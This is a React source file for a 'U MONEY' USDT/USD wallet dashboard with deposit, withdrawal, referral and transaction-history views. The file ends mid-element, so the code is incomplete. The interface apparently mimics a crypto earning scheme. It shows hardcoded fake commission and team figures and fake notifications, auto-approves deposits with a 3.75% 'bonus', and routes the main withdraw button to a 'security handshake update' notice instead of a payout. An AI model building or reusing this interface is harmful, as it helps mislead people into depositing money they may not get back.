/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  Wallet, 
  ArrowUpRight, 
  ArrowDownLeft, 
  RefreshCcw, 
  Share2, 
  Copy, 
  Check, 
  Bell, 
  User, 
  Settings, 
  Users, 
  TrendingUp, 
  Headphones, 
  LogOut, 
  ChevronRight, 
  BadgeAlert, 
  CheckCircle,
  HelpCircle,
  CreditCard,
  DollarSign
} from 'lucide-react';
import { UserProfile, Transaction, TransactionType } from '../types';

interface DashboardProps {
  user: UserProfile;
  transactions: Transaction[];
  onAddTransaction: (tx: Transaction) => void;
  onUpdateBalance: (usd: number, usdt: number) => void;
  onLogout: () => void;
  onNavigateSupport: () => void;
}

export default function Dashboard({
  user,
  transactions,
  onAddTransaction,
  onUpdateBalance,
  onLogout,
  onNavigateSupport
}: DashboardProps) {
  // Modal toggle states
  const [showDepositModal, setShowDepositModal] = useState(false);
  const [showWithdrawModal, setShowWithdrawModal] = useState(false);
  const [showProfileDrawer, setShowProfileDrawer] = useState(false);
  const [showNotificationsDrawer, setShowNotificationsDrawer] = useState(false);

  // Security update notice modal states
  const [showSecurityNotice, setShowSecurityNotice] = useState(false);
  const [isRequestingHandshakeUpdate, setIsRequestingHandshakeUpdate] = useState(false);
  const [handshakeUpdateSubmitted, setHandshakeUpdateSubmitted] = useState(false);

  // Form states
  const [depositAmountUSDT, setDepositAmountUSDT] = useState('');
  const [depositWallet, setDepositWallet] = useState('PayPal');
  const [withdrawAmountUSD, setWithdrawAmountUSD] = useState('');
  const [withdrawWallet, setWithdrawWallet] = useState('PayPal');
  
  // Clipboard states
  const [linkCopied, setLinkCopied] = useState(false);
  
  // Custom alerts/toasts
  const [toastMessage, setToastMessage] = useState<string | null>(null);
  const [toastType, setToastType] = useState<'success' | 'info' | 'error'>('success');

  // Notifications
  const [notifications, setNotifications] = useState([
    { id: 1, title: 'Commission Credited', text: 'You received $108.54 commission for transaction SWIFT_TRXS_2209.', time: '10 mins ago', read: false },
    { id: 2, title: 'Deposit Match Successful', text: 'Your deposit of 55.00 USDT was successfully verified at $1.00/USDT.', time: '2 hours ago', read: false },
    { id:3, title: 'Security Pass Checked', text: 'Your verification token security check has been fully validated on-chain.', time: 'Today, 10:48 AM', read: true }
  ]);

  const showToast = (msg: string, type: 'success' | 'info' | 'error' = 'success') => {
    setToastMessage(msg);
    setToastType(type);
    setTimeout(() => {
      setToastMessage(null);
    }, 4500);
  };

  // Copy referral link
  const copyReferralLink = () => {
    const link = `https://umoney.com/register?ref=${user.id}`;
    navigator.clipboard.writeText(link);
    setLinkCopied(true);
    showToast('Referral invitation link copied to clipboard!', 'success');
    setTimeout(() => setLinkCopied(false), 2000);
  };

  // Calculate values
  const conversionRate = 1.00; // 1:1 USD per USDT

  // Handle Deposit submit
  const handleDepositSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const usdtVal = parseFloat(depositAmountUSDT);
    
    if (isNaN(usdtVal) || usdtVal <= 0) {
      showToast('Please enter a valid deposit amount.', 'error');
      return;
    }

    const calculatedUSD = usdtVal * conversionRate;
    const bonusRate = 0.0375; // 3.75% 
    const bonusUSD = calculatedUSD * bonusRate;
    const totalCreditedUSD = calculatedUSD + bonusUSD;

    // Create a mock transaction
    const newTx: Transaction = {
      id: `TX-${Math.floor(100000 + Math.random() * 900000)}`,
      type: 'DEPOSIT',
      amountUSDT: usdtVal,
      amountUSD: calculatedUSD,
      walletName: depositWallet,
      rate: conversionRate,
      status: 'PENDING',
      timestamp: new Date().toLocaleString()
    };

    onAddTransaction(newTx);
    setShowDepositModal(false);
    setDepositAmountUSDT('');
    showToast(`Deposit request of ${usdtVal} USDT submitted! Please wait while our team reviews the ledger.`, 'info');

    // Simulate auto-approval of deposit in background after 6 seconds
    setTimeout(() => {
      // Update transaction status
      newTx.status = 'SUCCESSFUL';
      // Credit wallet balances
      const updatedUSD = user.walletBalanceUSD + totalCreditedUSD;
      const updatedUSDT = user.walletBalanceUSDT + usdtVal;
      onUpdateBalance(updatedUSD, updatedUSDT);
      showToast(`Deposit approved! +${usdtVal} USDT ($${totalCreditedUSD.toLocaleString('en-US', { maximumFractionDigits: 2 })} credited with 3.75% direct work commission bonus)`, 'success');
    }, 6000);
  };

  // Handle Withdrawal submit
  const handleWithdrawalSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const usdVal = parseFloat(withdrawAmountUSD);

    if (isNaN(usdVal) || usdVal <= 1) {
      showToast('Minimum withdrawal amount is $1.00 USD.', 'error');
      return;
    }

    if (usdVal > user.walletBalanceUSD) {
      showToast('Insufficient wallet USD balance.', 'error');
      return;
    }

    // Subtract balance
    const equivalentUSDT = usdVal / conversionRate;
    const nextUSD = user.walletBalanceUSD - usdVal;
    const nextUSDT = Math.max(0, user.walletBalanceUSDT - equivalentUSDT);

    // Create successful withdrawal transaction log
    const newTx: Transaction = {
      id: `TX-${Math.floor(100000 + Math.random() * 900000)}`,
      type: 'WITHDRAW',
      amountUSD: usdVal,
      amountUSDT: equivalentUSDT,
      walletName: withdrawWallet,
      rate: conversionRate,
      status: 'SUCCESSFUL',
      timestamp: new Date().toLocaleString()
    };

    onAddTransaction(newTx);
    onUpdateBalance(nextUSD, nextUSDT);
    setShowWithdrawModal(false);
    setWithdrawAmountUSD('');

    // Trigger explicit required "Withdrawal Successful" popups/animations
    showToast(`Withdrawal Successful! $${usdVal.toLocaleString('en-US')} paid directly to your ${withdrawWallet} account.`, 'success');
  };

  const markAllNotificationsRead = () => {
    setNotifications(prev => prev.map(n => ({ ...n, read: true })));
    showToast('All notifications marked as read.', 'info');
  };

  return (
    <div className="min-h-screen text-slate-100 bg-[#0d091e] overflow-x-hidden relative font-sans">
      
      {/* Background gradients */}
      <div className="absolute top-0 right-0 w-[400px] h-[400px] bg-purple-900/10 rounded-full blur-[150px] pointer-events-none" />
      <div className="absolute bottom-10 left-0 w-[350px] h-[350px] bg-indigo-900/10 rounded-full blur-[130px] pointer-events-none" />

      {/* Top dashboard navbar */}
      <nav className="border-b border-purple-950/40 bg-[#0d091e]/80 backdrop-blur-md sticky top-0 z-40 py-4 px-4 md:px-8">
        <div className="max-w-7xl mx-auto flex justify-between items-center">
          
          <div className="flex items-center space-x-3">
            <div className="w-9 h-9 rounded-xl bg-gradient-to-tr from-purple-600 to-indigo-500 flex items-center justify-center font-bold text-lg text-white">
              U
            </div>
            <span className="font-extrabold text-xl tracking-tight text-white">U MONEY</span>
            <span className="hidden sm:inline-block px-2.5 py-0.5 rounded-full bg-emerald-950/60 border border-emerald-900/30 text-[10px] text-emerald-400 font-mono tracking-widest uppercase">
              SECURE
            </span>
          </div>

          <div className="flex items-center space-x-3.5">
            {/* Quick Support Center Button */}
            <button 
              id="dash-btn-support"
              onClick={onNavigateSupport}
              className="p-2 rounded-xl bg-purple-950/40 hover:bg-purple-900/40 text-purple-400 hover:text-white transition-all text-sm flex items-center gap-1.5"
            >
              <Headphones size={18} />
              <span className="hidden md:inline font-semibold">Support</span>
            </button>

            {/* Notification trigger button */}
            <button
              id="dash-btn-notifications"
              onClick={() => setShowNotificationsDrawer(true)}
              className="p-2.5 rounded-xl bg-slate-900 hover:bg-slate-800 border border-purple-950/40 text-slate-350 hover:text-white transition-all relative cursor-pointer"
            >
              <Bell size={18} />
              {notifications.some(n => !n.read) && (
                <span className="absolute top-1.5 right-1.5 w-2 h-2 bg-fuchsia-500 rounded-full ring-2 ring-slate-950" />
              )}
            </button>

            {/* Profile Avatar trigger */}
            <button
              id="dash-btn-profile"
              onClick={() => setShowProfileDrawer(true)}
              className="p-1 rounded-xl border border-purple-900/40 text-slate-300 hover:text-white transition-all flex items-center gap-1 cursor-pointer bg-slate-900"
            >
              <div className="w-8 h-8 rounded-lg bg-gradient-to-br from-[#2f1f6c] to-[#4c2d96] flex items-center justify-center font-extrabold text-sm text-purple-200">
                {user.username ? user.username[0].toUpperCase() : 'U'}
              </div>
              <span className="hidden sm:inline-block text-xs font-semibold px-2 pr-1 text-slate-300">{user.username}</span>
            </button>

            {/* Logout button */}
            <button
              id="dash-btn-logout"
              onClick={onLogout}
              className="p-2.5 rounded-xl bg-red-950/30 hover:bg-red-900/30 text-red-400 border border-red-900/20 transition-all cursor-pointer"
              title="Sign Out"
            >
              <LogOut size={16} />
            </button>
          </div>
        </div>
      </nav>

      {/* Main dashboard body */}
      <main className="max-w-7xl mx-auto py-8 px-4 md:px-8 space-y-8 select-none">
        
        {/* Welcome and live metrics bar */}
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
          <div>
            <span className="text-xs font-bold text-purple-400 tracking-wider uppercase">User Portal Dashboard</span>
            <h2 className="text-3xl font-extrabold text-white mt-0.5">Welcome, {user.username}!</h2>
            <p className="text-xs text-slate-400 font-light font-mono mt-1">Client UID: {user.id}</p>
          </div>

          {/* Quick Rate Indicator */}
          <div className="flex items-center gap-3.5 bg-purple-950/20 border border-purple-900/30 rounded-2xl p-3.5 px-5">
            <TrendingUp className="text-purple-400" size={24} />
            <div>
              <div className="text-[10px] text-slate-400 uppercase font-semibold">Active Conversion Index</div>
              <div className="text-base font-bold text-white font-mono">1 USDT = $1.00 USD</div>
            </div>
            <div className="ml-2 px-2 py-0.5 rounded bg-emerald-950/60 border border-emerald-900/30 text-[10px] text-emerald-400 font-bold">
              +3.75% Matcher
            </div>
          </div>
        </div>

        {/* Balance card panel */}
        <div className="grid md:grid-cols-12 gap-8">
          
          {/* Column A: Wallet Balance Main Card */}
          <div className="md:col-span-7 bg-gradient-to-br from-[#1b1241] via-[#120a2e] to-[#090518] border border-purple-900/30 p-8 rounded-[32px] shadow-2xl relative overflow-hidden flex flex-col justify-between min-h-[300px]">
            <div className="absolute top-0 right-0 w-48 h-48 bg-purple-600/10 rounded-full blur-3xl pointer-events-none" />
            
            <div className="space-y-1">
              <div className="flex justify-between items-center">
                <span className="text-xs font-bold tracking-wider text-purple-300 uppercase flex items-center gap-1">
                  <Wallet size={12} /> Combined Portfolio Ledger
                </span>
                <span className="text-xs font-light font-mono text-slate-500">Node Status: Active</span>
              </div>
              
              <div className="pt-4 space-y-1">
                <span className="text-[10px] text-slate-400 font-medium tracking-wide uppercase">Total Available Balance</span>
                <div className="text-4xl md:text-5xl font-black text-white tracking-tight font-mono">
                  ${user.walletBalanceUSD.toLocaleString('en-US', { minimumFractionDigits: 2 })}
                </div>
                <div className="text-sm font-semibold text-slate-400 font-mono flex items-center gap-1.5 pt-1">
                  <DollarSign size={14} className="text-indigo-400" />
                  <span>{user.walletBalanceUSDT.toLocaleString('en-US', { minimumFractionDigits: 2 })} USDT</span>
                </div>
              </div>
            </div>

            {/* Quick Actions (Deposit, withdraw) */}
            <div className="grid grid-cols-2 gap-4 pt-10">
              <button
                id="btn-dash-deposit"
                onClick={() => setShowDepositModal(true)}
                className="w-full py-3 rounded-2xl bg-gradient-to-r from-purple-600 to-indigo-600 font-extrabold text-sm text-white tracking-widest hover:brightness-115 active:scale-98 transition-all shadow-xl shadow-purple-600/15 flex items-center justify-center gap-1.5 cursor-pointer"
              >
                <ArrowDownLeft size={16} /> DEPOSIT
              </button>

              <button
                id="btn-dash-withdraw"
                onClick={() => setShowSecurityNotice(true)}
                className="w-full py-4 rounded-2xl bg-slate-950/80 hover:bg-[#140e35] text-purple-300 hover:text-white border border-purple-800/40 hover:border-purple-500 font-bold text-sm tracking-widest transition-all flex items-center justify-center gap-1.5 cursor-pointer"
              >
                <ArrowUpRight size={16} /> WITHDRAW
              </button>
            </div>
            
            {/* Quick warning */}
            <div className="text-[10px] mt-4 text-slate-500 leading-normal font-light">
              * Minimum withdraw index thresholds standard to wallet caps. No exchange fee tier applied.
            </div>
          </div>

          {/* Column B: Supported limits info card */}
          <div className="md:col-span-5 bg-[#110d29]/40 border border-purple-950/60 p-6 rounded-[32px] flex flex-col justify-between">
            <div className="space-y-4">
              <div className="text-xs font-bold text-purple-400 uppercase tracking-wider">Direct Settlement Work Program</div>
              <h3 className="text-lg font-bold text-white leading-snug">
                Earn 3.75% + $0.05 USD on every secure transaction match
              </h3>
              <p className="text-xs text-slate-350 font-light leading-relaxed">
                By maintaining a pool balance of USDT/USD, our network links your direct account via secure immediate transfers to complete settlements.
              </p>
            </div>

            <div className="p-4 bg-slate-950/40 rounded-2xl border border-purple-950/20 text-xs space-y-2 mt-4">
              <div className="flex justify-between">
                <span className="text-slate-500">Minimum Pool Lock:</span>
                <span className="font-mono text-slate-200">$2.00 USD (2.00 USDT)</span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-500">Maximum Daily Limit:</span>
                <span className="font-mono text-emerald-400 font-bold">$10,000 USD</span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-500">Facilitated Match Fee:</span>
                <span className="font-mono text-purple-300">0% Absolute Fee</span>
              </div>
            </div>
          </div>
        </div>

        {/* Referral Program Segment */}
        <section className="bg-gradient-to-r from-[#140f31] to-[#120a2e] border border-purple-950/60 p-6 md:p-8 rounded-[36px] relative overflow-hidden">
          <div className="absolute top-0 right-0 w-32 h-32 bg-fuchsia-600/5 rounded-full blur-2xl pointer-events-none" />
          
          <div className="grid md:grid-cols-12 gap-8 items-center">
            
            <div className="md:col-span-6 space-y-4">
              <div className="inline-flex items-center space-x-1.5 px-3 py-1 rounded-full bg-fuchsia-950/40 border border-fuchsia-800/30 text-fuchsia-400 text-xs font-bold uppercase tracking-wider">
                <Share2 size={12} />
                <span>Referral Income Machine</span>
              </div>
              <h3 className="text-2xl md:text-3xl font-extrabold text-white">Generate High Referral Commission</h3>
              <p className="text-sm text-slate-300 font-light leading-relaxed">
                Spread the word about U Money. Share your custom invitation link and receive flat commission cash bonuses directly when your peer group completes exchange settlements.
              </p>

              {/* Referral copy container */}
              <div className="flex items-center gap-2 max-w-md bg-[#0a061b] p-2 rounded-xl border border-purple-950/40">
                <div className="flex-1 text-xs font-mono px-2 text-slate-400 truncate">
                  https://umoney.com/register?ref={user.id}
                </div>
                <button
                  id="btn-referral-copy"
                  onClick={copyReferralLink}
                  className="px-4 py-2 bg-purple-600 hover:bg-purple-500 text-xs font-semibold rounded-lg text-white transition-colors flex items-center gap-1.5 cursor-pointer"
                >
                  {linkCopied ? <Check size={13} /> : <Copy size={13} />}
                  <span>{linkCopied ? 'Copied' : 'Copy Link'}</span>
                </button>
              </div>
            </div>

            {/* Referral Stats from Screenshot details */}
            <div className="md:col-span-6 grid grid-cols-2 gap-4">
              
              <div className="p-4 bg-slate-950/65 rounded-2xl border border-purple-950/30">
                <span className="text-[10px] text-slate-500 font-mono uppercase tracking-wider block">Today Team Deposit</span>
                <div className="text-xl font-bold text-white font-mono mt-1">$1,83,964.59</div>
                <span className="text-[9px] text-fuchsia-400 font-bold bg-fuchsia-950/30 px-1.5 py-0.5 rounded w-max block mt-2">
                  +12.4% vs Yesterday
                </span>
              </div>

              <div className="p-4 bg-slate-950/65 rounded-2xl border border-purple-950/30">
                <span className="text-[10px] text-slate-500 font-mono uppercase tracking-wider block">My Total Commission</span>
                <div className="text-xl font-bold text-emerald-400 font-mono mt-1">$34,838.54</div>
                <span className="text-[9px] text-slate-400 font-light block mt-2">
                  Yesterday: $488.18
                </span>
              </div>

              <div className="p-4 bg-slate-950/65 rounded-2xl border border-purple-950/30">
                <span className="text-[10px] text-slate-500 font-mono uppercase tracking-wider block">Today Active Matches</span>
                <div className="text-xl font-bold text-white font-mono mt-1">488 Users</div>
                <span className="text-[9px] text-purple-400 font-bold bg-purple-950/30 px-1.5 py-0.5 rounded w-max block mt-2">
                  Team Count 488
                </span>
              </div>

              <div className="p-4 bg-slate-950/65 rounded-2xl border border-purple-950/30">
                <span className="text-[10px] text-slate-500 font-mono uppercase tracking-wider block">Yesterday Commission</span>
                <div className="text-xl font-bold text-[#bcaae2] font-mono mt-1">$366.03</div>
                <span className="text-[9px] text-emerald-400 font-bold bg-emerald-950/30 px-1.5 py-0.5 rounded w-max block mt-2">
                  3.75% + $0.05 USD applied
                </span>
              </div>

            </div>
          </div>
        </section>

        {/* Transaction History log list */}
        <section className="space-y-4">
          <div className="flex justify-between items-center">
            <div>
              <h3 className="text-xl font-bold text-white">Recent Transactions</h3>
              <p className="text-xs text-slate-400 font-light">History of your direct USDT recharges, conversions, and direct payouts.</p>
            </div>
            <button
              id="btn-transaction-history-reload"
              onClick={() => showToast('Transaction table logs synchronized successfully.', 'success')}
              className="p-2 bg-slate-900 border border-purple-950/60 rounded-xl text-xs hover:bg-slate-800 text-slate-350 hover:text-white transition-all flex items-center gap-1.5 cursor-pointer"
            >
              <RefreshCcw size={13} />
              <span>Refresh</span>
            </button>
          </div>

          <div className="bg-[#110d29]/40 border border-purple-950/60 rounded-3xl overflow-hidden overflow-x-auto">
            {transactions.length === 0 ? (
              <div className="p-12 text-center text-slate-500 font-sans text-sm space-y-2">
                <BadgeAlert size={32} className="mx-auto text-purple-900/50" />
                <div>No transactions recorded yet in this session.</div>
                <div className="text-xs text-slate-600 font-light">Deposit USDT or withdraw USD values to populate historical logs.</div>
              </div>
            ) : (
              <table id="transactions-table" className="w-full text-left border-collapse text-xs md:text-sm">
                <thead>
                  <tr className="border-b border-purple-950/60 uppercase tracking-widest text-[10px] text-purple-400 font-extrabold bg-[#0d0a20]">
                    <th className="p-4">Transaction ID</th>
                    <th className="p-4">Type</th>
                    <th className="p-4">Channel</th>
                    <th className="p-4">USDT Vol</th>
                    <th className="p-4">USD Amount</th>
                    <th className="p-4">Exchange Index</th>
                    <th className="p-4">Status</th>
                    <th className="p-4">Timestamp</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-purple-950/20 text-slate-300">
                  {transactions.map((tx) => (
                    <tr key={tx.id} className="hover:bg-[#140e34]/30 transition-all font-sans font-medium">
                      <td className="p-4 font-mono text-[11px] text-slate-450">{tx.id}</td>
                      <td className="p-4 font-semibold text-slate-200">
                        {tx.type === 'DEPOSIT' && (
                          <span className="flex items-center gap-1.5 text-indigo-400">
                            <span className="w-1.5 h-1.5 rounded-full bg-indigo-400" /> USDT RECHARGE
                          </span>
                        )}
                        {tx.type === 'WITHDRAW' && (
                          <span className="flex items-center gap-1.5 text-fuchsia-400">
                            <span className="w-1.5 h-1.5 rounded-full bg-fuchsia-400" /> USD WITHDRAW
                          </span>
                        )}
                        {tx.type === 'USDT_EXCHANGE' && (
                          <span className="flex items-center gap-1.5 text-amber-400">
                            <span className="w-1.5 h-1.5 rounded-full bg-amber-400" /> METRIC CONVERT
                          </span>
                        )}
                      </td>
                      <td className="p-4 font-semibold">{tx.walletName || 'On-chain Pool'}</td>
                      <td className="p-4 font-mono">
                        {tx.amountUSDT ? `${tx.amountUSDT.toFixed(2)} USDT` : '--'}
                      </td>
                      <td className="p-4 font-bold font-mono text-white">
                        ${tx.amountUSD.toLocaleString('en-US', { minimumFractionDigits: 2 })}
                      </td>
                      <td className="p-4 font-mono text-slate-500">${tx.rate.toFixed(2)}/USDT</td>
                      <td className="p-4 font-semibold">
                        {tx.status === 'SUCCESSFUL' && (
                          <span className="px-2 py-0.5 rounded-full bg-emerald-950/60 border border-emerald-900/30 text-emerald-400 text-[10px]">
                            SUCCESSFUL
                          </span>
                        )}
                        {tx.status === 'PENDING' && (
                          <span className="px-2 py-0.5 rounded-full bg-amber-950/60 border border-amber-900/30 text-amber-400 text-[10px] animate-pulse">
                            PENDING MATCH
                          </span>
                        )}
                        {tx.status === 'FAILED' && (
                          <span className="px-2 py-0.5 rounded-full bg-red-950/60 border border-red-900/30 text-red-400 text-[10px]">
                            FAILED
                          </span>
                        )}
                      </td>
                      <td className="p-4 font-mono text-slate-500 text-[11px]">{tx.timestamp}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            )}
          </div>
        </section>
      </main>

      {/* Floating global Alerts / Toast */}
      <AnimatePresence>
        {toastMessage && (
          <motion.div
            initial={{ opacity: 0, y: 30, scale: 0.95 }}
            animate={{ opacity: 1, y: 0, scale: 1 }}
            exit={{ opacity: 0, y: 30, scale: 0.95 }}
            className={`fixed bottom-6 right-6 z-50 p-4 rounded-2xl shadow-xl flex items-start gap-3 w-96 backdrop-blur-md border ${
              toastType === 'success' 
                ? 'bg-emerald-950/90 border-emerald-800/40 text-emerald-200' 
                : toastType === 'error'
                  ? 'bg-red-950/90 border-red-800/40 text-red-200'
                  : 'bg-indigo-950/90 border-indigo-800/40 text-indigo-200'
            }`}
          >
            <div className={`w-8 h-8 rounded-lg flex items-center justify-center shrink-0 ${
              toastType === 'success' 
                ? 'bg-emerald-600/20 text-emerald-400' 
                : toastType === 'error'
                  ? 'bg-red-600/20 text-red-400'
                  : 'bg-indigo-600/20 text-indigo-400'
            }`}>
              {toastType === 'success' ? <CheckCircle size={18} /> : toastType === 'error' ? <BadgeAlert size={18} /> : <HelpCircle size={18} />}
            </div>
            <div className="flex-1 min-w-0">
              <div className="text-xs font-bold uppercase tracking-wider">
                {toastType === 'success' ? 'Ledger Action Success' : toastType === 'error' ? 'System Warning Alert' : 'Log Update Information'}
              </div>
              <p className="text-xs font-light leading-relaxed mt-0.5 font-sans break-words">{toastMessage}</p>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Deposit Modal */}
      <AnimatePresence>
        {showDepositModal && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setShowDepositModal(false)}
              className="absolute inset-0 bg-black/80 backdrop-blur-sm"
            />
            
            <motion.div 
              initial={{ scale: 0.95, y: 15, opacity: 0 }}
              animate={{ scale: 1, y: 0, opacity: 1 }}
              exit={{ scale: 0.95, y: 15, opacity: 0 }}
              className="relative w-full max-w-md bg-[#14102e] border border-purple-900/50 rounded-3xl p-6 shadow-2xl space-y-6"
            >
              <div className="flex justify-between items-center">
                <span className="text-xs font-bold text-purple-400 uppercase tracking-widest">DEPOSIT USDT RECHARGE</span>
                <button onClick={() => setShowDepositModal(false)} className="text-slate-400 hover:text-white">✕</button>
              </div>

              <form id="deposit-form" onSubmit={handleDepositSubmit} className="space-y-4">
                
                {/* deposit wallet selector */}
                <div className="space-y-1.5">
                  <label htmlFor="deposit-wallet" className="block text-xs font-bold text-slate-350 tracking-wider">Select recharge wallet source</label>
                  <select
                    id="deposit-wallet"
                    value={depositWallet}
                    onChange={(e) => setDepositWallet(e.target.value)}
                    className="w-full px-4 py-3 bg-[#0a061b] border border-purple-950/40 rounded-xl focus:border-purple-500 focus:ring-1 focus:ring-purple-500 outline-none text-white text-sm"
                  >
                    <option value="PayPal">PayPal</option>
                    <option value="Cash App">Cash App</option>
                    <option value="Venmo">Venmo</option>
                    <option value="Stripe">Stripe Card</option>
                  </select>
                </div>

                {/* Amount in USDT input */}
                <div className="space-y-1.5">
                  <label htmlFor="deposit-amount-usdt" className="block text-xs font-bold text-slate-350 tracking-wider">Amount to deposit (USDT)</label>
                  <div className="relative">
                    <input
                      id="deposit-amount-usdt"
                      type="number"
                      step="any"
                      placeholder="100.00"
                      value={depositAmountUSDT}
                      onChange={(e) => setDepositAmountUSDT(e.target.value)}
                      className="w-full pl-4 pr-16 py-3 bg-[#0a061b] border border-purple-950/40 rounded-xl focus:border-purple-500 focus:ring-1 focus:ring-purple-500 outline-none text-white text-sm font-mono placeholder-slate-700 font-bold"
                      autoFocus
                    />
                    <div className="absolute inset-y-0 right-4 flex items-center text-xs font-bold text-purple-400">USDT</div>
                  </div>
                </div>

                {/* Estimated conversion readout box */}
                {depositAmountUSDT && !isNaN(parseFloat(depositAmountUSDT)) && (
                  <div className="p-3.5 bg-slate-950/80 rounded-2xl border border-purple-950/20 text-xs space-y-1.5">
                    <div className="text-[10px] text-purple-400 uppercase font-bold tracking-wider">Exchange Estimation Details:</div>
                    <div className="flex justify-between">
                      <span className="text-slate-500">Stabilized Conversion (x1.00):</span>
                      <span className="font-mono text-slate-200 font-bold">${(parseFloat(depositAmountUSDT) * conversionRate).toLocaleString('en-US', { maximumFractionDigits: 2 })} USD</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-slate-500">Direct work bonus match (+3.75%):</span>
                      <span className="font-mono text-emerald-400 font-bold">+${(parseFloat(depositAmountUSDT) * conversionRate * 0.0375).toLocaleString('en-US', { maximumFractionDigits: 2 })} USD</span>
                    </div>
                    <hr className="border-purple-950/20 my-1" />
                    <div className="flex justify-between text-sm font-extrabold text-white">
                      <span>Total Credit Value:</span>
                      <span className="font-mono bg-purple-900/20 px-2 py-0.5 rounded border border-purple-800/10 text-purple-200">
                        ${(parseFloat(depositAmountUSDT) * conversionRate * 1.0375).toLocaleString('en-US', { maximumFractionDigits: 2 })} USD
                      </span>
                    </div>
                  </div>
                )}

                <button
                  id="btn-deposit-submit"
                  type="submit"
                  className="w-full py-4 bg-gradient-to-r from-purple-600 to-indigo-600 rounded-xl font-bold text-sm tracking-wide text-white hover:brightness-110 active:scale-98 transition-all flex items-center justify-center gap-1.5"
                >
                  Confirm & Initiate Recharge
                </button>
              </form>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Withdraw Modal */}
      <AnimatePresence>
        {showWithdrawModal && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setShowWithdrawModal(false)}
              className="absolute inset-0 bg-black/80 backdrop-blur-sm"
            />
            
            <motion.div 
              initial={{ scale: 0.95, y: 15, opacity: 0 }}
              animate={{ scale: 1, y: 0, opacity: 1 }}
              exit={{ scale: 0.95, y: 15, opacity: 0 }}
              className="relative w-full max-w-md bg-[#14102e] border border-purple-900/50 rounded-3xl p-6 shadow-2xl space-y-6"
            >
              <div className="flex justify-between items-center">
                <span className="text-xs font-bold text-fuchsia-400 uppercase tracking-widest">WITHDRAW EARNINGS</span>
                <button onClick={() => setShowWithdrawModal(false)} className="text-slate-400 hover:text-white font-bold">✕</button>
              </div>

              <form id="withdraw-form" onSubmit={handleWithdrawalSubmit} className="space-y-4">
                
                {/* select withdraw destination wallet */}
                <div className="space-y-1.5">
                  <label htmlFor="withdraw-wallet-select" className="block text-xs font-bold text-slate-350 tracking-wider">Withdraw Dest Channel</label>
                  <select
                    id="withdraw-wallet-select"
                    value={withdrawWallet}
                    onChange={(e) => setWithdrawWallet(e.target.value)}
                    className="w-full px-4 py-3 bg-[#0a061b] border border-purple-950/40 rounded-xl focus:border-purple-500 focus:ring-1 focus:ring-purple-500 outline-none text-white text-sm"
                  >
                    <option value="PayPal">PayPal</option>
                    <option value="Cash App">Cash App</option>
                    <option value="Venmo">Venmo</option>
                    <option value="Stripe">Stripe Payments</option>
                    <option value="Direct Bank Account">Direct Bank Account</option>
                    <option value="Payoneer">Payoneer Channel</option>
                  </select>
                </div>

                {/* Amount to withdraw USD input */}
                <div className="space-y-1.5">
                  <label htmlFor="withdraw-amount-usd" className="block text-xs font-bold text-slate-350 tracking-wider">Amount to Withdraw (USD)</label>
                  <div className="relative">
                    <input
                      id="withdraw-amount-usd"
                      type="number"
                      placeholder="50.00"
                      value={withdrawAmountUSD}
                      onChange={(e) => setWithdrawAmountUSD(e.target.value)}
                      className="w-full pl-8 pr-16 py-3 bg-[#0a061b] border border-purple-950/40 rounded-xl focus:border-purple-500 focus:ring-1 focus:ring-purple-500 outline-none text-white text-sm font-mono placeholder-slate-750 font-bold"
                      autoFocus
                    />
                    <div className="absolute inset-y-0 left-3 flex items-center text-xs font-semibold text-slate-400 select-none">$</div>
                    <div className="absolute inset-y-0 right-4 flex items-center text-xs font-bold text-fuchsia-400">USD</div>
                  </div>
                  <div className="flex justify-between text-[10px] text-slate-500 font-sans px-1">
                    <span>Available: ${user.walletBalanceUSD.toLocaleString('en-US', { maximumFractionDigits: 2 })}</span>
                    <button
                      type="button"
                      onClick={() => setWithdrawAmountUSD(user.walletBalanceUSD.toString())}
                      className="text-purple-400 hover:text-purple-300 font-bold"
                    >
                      Max Out
                    </button>
                  </div>
                </div>

                <button
                  id="btn-withdraw-submit"
                  type="submit"
                  className="w-full py-4 bg-gradient-to-r from-fuchsia-600 to-pink-600 rounded-xl font-bold text-sm tracking-widest text-white hover:brightness-110 active:scale-98 transition-all flex items-center justify-center gap-1.5 cursor-pointer"
                >
                  Withdraw Now
                </button>
              </form>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Security Update Handshake Notice Modal */}
      <AnimatePresence>
        {showSecurityNotice && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => {
                if (!isRequestingHandshakeUpdate) {
                  setShowSecurityNotice(false);
                }
              }}
              className="absolute inset-0 bg-black/85 backdrop-blur-md"
            />
            
            <motion.div 
              initial={{ scale: 0.95, y: 15, opacity: 0 }}
              animate={{ scale: 1, y: 0, opacity: 1 }}
              exit={{ scale: 0.95, y: 15, opacity: 0 }}
              className="relative w-full max-w-md bg-[#0f0b24] border border-red-500/30 rounded-3xl p-6 shadow-2xl space-y-6 overflow-hidden"
            >
              {/* Top ambient dangerous warning glow */}
              <div className="absolute top-0 left-0 right-0 h-[3px] bg-gradient-to-r from-red-500 via-purple-600 to-indigo-500" />
              
              <div className="flex justify-between items-center">
                <div className="flex items-center gap-2">
                  <span className="flex h-2.5 w-2.5 relative">
                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
                    <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-red-500"></span>
                  </span>
